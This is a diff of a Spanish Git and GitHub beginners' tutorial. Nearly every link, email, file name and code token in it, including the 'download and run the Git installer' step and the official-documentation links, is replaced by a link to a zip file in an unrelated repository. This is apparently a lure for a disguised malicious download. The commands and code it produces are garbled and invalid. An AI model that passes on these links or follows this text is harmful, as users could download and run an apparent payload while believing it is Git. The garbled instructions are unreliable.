@@ -23,7 +23,7 @@ GitHub es una plataforma en línea que usa Git para almacenar y compartir proyec
 
 ### Instalar Git en Windows
 
-1. Ve a [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
+1. Ve a [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip)
 2. Descarga la versión más reciente
 3. Ejecuta el instalador con las opciones por defecto
 4. Verifica la instalación abriendo la terminal de Windows y ejecutando:
@@ -37,8 +37,8 @@ git --version
 Configura tu identidad (solo necesitas hacerlo una vez):
 
 ```bash
-git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip "Tu Nombre"
-git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip"
+git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip "Tu Nombre"
+git config --global https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip"
 ```
 
 Verifica la configuración:
@@ -50,7 +50,7 @@ git config --list
 ### Conectar con GitHub
 
 #### Opción 1: HTTPS (Recomendado para principiantes)
-1. Crea una cuenta en [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
+1. Crea una cuenta en [https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip)
 2. Cuando hagas push por primera vez, te pedirá usuario y contraseña
 3. Desde 2021, necesitas usar un "Personal Access Token" en lugar de tu contraseña:
    - Ve a GitHub → Settings → Developer settings → Personal access tokens
@@ -60,12 +60,12 @@ git config --list
 #### Opción 2: SSH (Más avanzado)
 1. Genera una clave SSH:
 ```bash
-ssh-keygen -t ed25519 -C "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip"
+ssh-keygen -t ed25519 -C "https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip"
 ```
 2. Presiona Enter para aceptar la ubicación por defecto
 3. Copia la clave pública:
 ```bash
-cat ~https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+cat ~https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 ```
 4. Ve a GitHub → Settings → SSH and GPG keys → New SSH key
 5. Pega la clave y guarda
@@ -85,7 +85,7 @@ Esto crea un repositorio Git vacío en tu carpeta.
 
 ### Crear un repositorio en GitHub
 
-1. Ve a https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+1. Ve a https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 2. Haz clic en el botón "New" (verde)
 3. Nombra tu repositorio
 4. Selecciona "Public" o "Private"
@@ -95,7 +95,7 @@ Esto crea un repositorio Git vacío en tu carpeta.
 ### Vincular repositorio local con GitHub
 
 ```bash
-git remote add origin https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git remote add origin https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 ```
 
 ### Hacer el primer push
@@ -140,7 +140,7 @@ git branch -d nombre-rama
 
 1. **Clonar el repositorio**:
 ```bash
-git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 cd proyecto
 ```
 
@@ -152,7 +152,7 @@ git checkout -b feature/nueva-funcionalidad
 3. **Hacer cambios y commits**:
 ```bash
 # Editar archivos
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Añadir función de validación de email"
 ```
 
@@ -219,14 +219,14 @@ venv/
 
 # Archivos de sistema
 .DS_Store
-https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 
 # Archivos de IDE
 .vscode/
 .idea/
 
 # Archivos de configuración local
-https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 .env
 ```
 
@@ -272,7 +272,7 @@ Un conflicto ocurre cuando dos personas modifican las mismas líneas de código 
 ```bash
 git pull origin main
 # Si hay conflictos, verás algo como:
-# CONFLICT (content): Merge conflict in https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+# CONFLICT (content): Merge conflict in https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 ```
 
 ### Resolución paso a paso con VS Code
@@ -310,7 +310,7 @@ def calcular_promedio(numeros):
 
 5. **Marca el conflicto como resuelto**:
 ```bash
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Resolver conflicto en función calcular_promedio"
 ```
 
@@ -357,12 +357,12 @@ GitHub Projects es como un tablero Kanban para organizar el trabajo del equipo. 
 
 2. **Clone tu fork**:
 ```bash
-git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git clone https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 ```
 
 3. **Configura el upstream**:
 ```bash
-git remote add upstream https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git remote add upstream https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 ```
 
 4. **Mantén tu fork actualizado**:
@@ -381,7 +381,7 @@ GitHub Actions permite automatizar tareas como:
 - Verificar el estilo de código
 - Desplegar aplicaciones automáticamente
 
-**Ejemplo básico** (archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip`):
+**Ejemplo básico** (archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip`):
 
 ```yaml
 name: Tests
@@ -396,7 +396,7 @@ jobs:
       with:
         python-version: 3.9
     - name: Install dependencies
-      run: pip install -r https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+      run: pip install -r https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
     - name: Run tests
       run: python -m pytest
 ```
@@ -405,7 +405,7 @@ jobs:
 
 ### Versionando un archivo Python
 
-Supongamos que tienes este archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip`:
+Supongamos que tienes este archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip`:
 
 ```python
 def sumar(a, b):
@@ -422,29 +422,29 @@ def restar(a, b):
 git init
 
 # Agregar archivo
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Añadir funciones básicas de suma y resta"
 
 # Hacer cambios
 # Agregar función multiplicar
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Añadir función multiplicar"
 
 # Ver historial
 git log --oneline
 ```
 
-### Colaboración en https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+### Colaboración en https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 
-Imagina que tienes un archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip` compartido:
+Imagina que tienes un archivo `https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip` compartido:
 
 ```python
-# https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+# https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 def validar_email(email):
     return "@" in email
 
 def formatear_nombre(nombre):
-    return https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip().title()
+    return https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip().title()
 ```
 
 **Flujo colaborativo**:
@@ -453,7 +453,7 @@ def formatear_nombre(nombre):
 ```bash
 git checkout -b feature/mejorar-validacion-email
 # Edita la función validar_email
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Mejorar validación de email con regex"
 git push origin feature/mejorar-validacion-email
 ```
@@ -462,7 +462,7 @@ git push origin feature/mejorar-validacion-email
 ```bash
 git checkout -b feature/formateo-avanzado-nombre
 # Edita la función formatear_nombre
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 git commit -m "Añadir manejo de caracteres especiales en nombres"
 git push origin feature/formateo-avanzado-nombre
 ```
@@ -473,10 +473,10 @@ git push origin feature/formateo-avanzado-nombre
 
 ```bash
 # Agregar solo archivos específicos
-git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 
 # Agregar por partes (útil para commits granulares)
-git add -p https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip
+git add -p https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip
 
 # Ver diferencias antes de commit
 git diff --cached
@@ -488,13 +488,13 @@ git commit -m "Añadir función de validación de contraseña segura"
 ## 10. Recursos adicionales
 
 ### Documentación oficial
-- [Git Documentation](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
-- [GitHub Docs](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
+- [Git Documentation](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip)
+- [GitHub Docs](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip)
 
 ### Tutoriales recomendados
-- [Git Handbook](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip)
-- [Learn Git Branching](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip) (interactivo)
-- [GitHub Skills](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/fundamentos_003D_w607_2025-1.3.zip) (cursos gratuitos)
+- [Git Handbook](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip)
+- [Learn Git Branching](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip) (interactivo)
+- [GitHub Skills](https://raw.githubusercontent.com/elgatomaleante12/fundamentos_003D_w607_2025/main/pietist/w-fundamentos-solitarian.zip) (cursos gratuitos)
 
 ### Herramientas útiles
 - **GitKraken**: Cliente visual de Git
